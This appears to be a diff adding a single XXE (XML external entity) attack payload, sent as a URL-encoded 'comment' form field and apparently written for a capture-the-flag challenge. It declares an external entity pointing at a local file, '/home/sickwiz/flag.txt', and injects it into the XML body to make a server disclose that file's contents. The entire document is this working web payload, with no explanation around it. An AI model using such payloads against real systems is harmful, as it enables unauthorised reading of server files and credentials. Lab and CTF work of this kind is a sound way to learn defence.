@@ -1,0 +1,5 @@
+comment=<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE asdf [<!ENTITY xxe SYSTEM 'file:///home/sickwiz/flag.txt'>]>
+<root> <comment>
+    <content>%26xxe;</content>
+</comment></root
